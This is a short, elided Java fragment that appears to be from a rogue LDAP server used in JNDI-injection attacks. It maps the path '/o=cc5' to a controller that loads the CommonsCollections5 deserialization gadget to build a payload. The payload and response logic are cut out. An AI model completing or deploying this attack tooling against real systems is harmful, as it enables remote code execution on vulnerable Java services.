...
@LdapMapping(uri = { "/o=cc5" })
public class Cc5 implements LdapController {
    ...
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        ...
        Method m = CommonsCollections5.class.getMethod("getObject", String.class);
        CommonsCollections5 urldnsObj = new CommonsCollections5();
